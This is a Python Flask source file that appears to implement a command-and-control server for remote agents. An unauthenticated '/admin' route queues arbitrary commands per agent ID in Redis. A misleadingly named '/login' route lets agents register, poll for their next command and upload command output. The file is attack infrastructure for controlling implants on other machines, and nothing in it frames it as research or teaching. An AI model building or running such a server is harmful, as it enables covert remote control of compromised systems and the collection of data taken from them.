from flask import Flask, request, Response
import redis
from functions import *
import os

script_dir = os.path.dirname(os.path.abspath(__file__))
db_path = os.path.join(script_dir, 'agents.db')
if not os.path.exists(db_path):
    create_db(db_path)

r = redis.Redis(host='127.0.0.1', port=6379, db=0, decode_responses=True)


app = Flask(__name__)

@app.route('/admin', methods=['POST'])
def send_command():
    data = request.json
    if request.method == 'POST':
        uuid = data.get('uuid')
        cmd = data.get('command')
        r.rpush(uuid, cmd)
        if r.llen(uuid) > 100:
            r.lpop(uuid)
    return "Command Sent!"

@app.route('/login', methods=['GET', 'POST'])
def commander():
    if request.method == 'GET':
        uuid = request.args.get('uuid')
        raw_profile = request.headers.get("User-Agent").split("/", 1)
        profile = raw_profile[0]
        cache = r.lindex(uuid, -1)
        if r.exists(uuid) == 0:
            command = register_agent(uuid, profile, db_path)

        elif "SEEN" in cache or "AGENT REGISTERED" in cache:
            update_seen(uuid, db_path)
            command = ""
        else:
            update_seen(uuid, db_path)
            command = cache
            r.rpush(uuid, "SEEN")
            small_check(uuid, db_path)
        return command

    elif request.method == 'POST':
        uuid = request.args.get('uuid')
        data = request.data.decode('utf-8')
        if uuid and data:
            key = f"{uuid}-output"
            r.lpush(key, data)
        return "Success"
    else:
        return "Invalid Method"

# This allows you to run the app directly with `python app.py`
if __name__ == '__main__':
    app.run(debug=True)